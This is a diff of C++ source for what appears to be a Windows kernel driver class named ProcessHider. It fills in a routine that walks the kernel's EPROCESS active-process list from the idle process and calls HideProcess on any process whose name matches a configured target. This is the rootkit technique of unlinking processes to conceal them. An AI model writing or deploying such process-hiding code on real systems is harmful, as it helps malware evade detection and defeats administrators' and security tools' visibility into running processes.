@@ -68,41 +68,54 @@ namespace filter
 		ExFreePool(process_name->Buffer);
 
 		return ret;
-
 	}
 
 	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
 	{
-		return false;
+		return ulti::CheckEqualString(process_name, process_to_hide_);
 	}
 
 	void ProcessHider::HideOnInitializeOperation()
 	{
 		WCHAR process_name[MAX_SIZE];
-		HANDLE last_pid;
+		int last_pid;
 		PLIST_ENTRY next_p_list_entry_eprocess;
 
 		P_CUSTOM_EPROCESS cur_p_eprocess = NULL, next_p_eprocess = NULL;
-		if (PsLookupProcessByProcessId((HANDLE)SYSTEM_PID, (PEPROCESS *)&cur_p_eprocess) != STATUS_SUCCESS)
+		if (PsLookupProcessByProcessId((HANDLE)SYSTEM_IDLE_PID, (PEPROCESS *)&cur_p_eprocess) != STATUS_SUCCESS)
 		{
 			return;
 		}
-
-		last_pid = (HANDLE)SYSTEM_PID;
-
+		last_pid = SYSTEM_IDLE_PID;
 		while (true)
 		{
+			HANDLE cur_pid = cur_p_eprocess->UniqueProcesId;
+
+			if ((int)cur_pid < last_pid)
+			{
+				break;
+			}
+
+			last_pid = (int)cur_pid;
 			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
 			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
 
-			if (GetShortNameByPid(process_name, MAX_SIZE, cur_p_eprocess->UniqueProcesId) == true)
+			if (GetShortNameByPid(process_name, MAX_SIZE, cur_pid) == true)
 			{
 				if (IsProcessInHiddenList(process_name))
 				{
-
+					if (HideProcess(cur_p_eprocess) == true)
+					{
+						// Do something
+						DebugMessage("Process created with PID %d and name %S", (int)cur_pid, process_name);
+					}
 				}
 			}
-			if ()
+			cur_p_eprocess = next_p_eprocess;
+			if (next_p_eprocess->UniqueProcesId == (HANDLE)SYSTEM_IDLE_PID)
+			{
+				break;
+			}
 		}
 	}
 
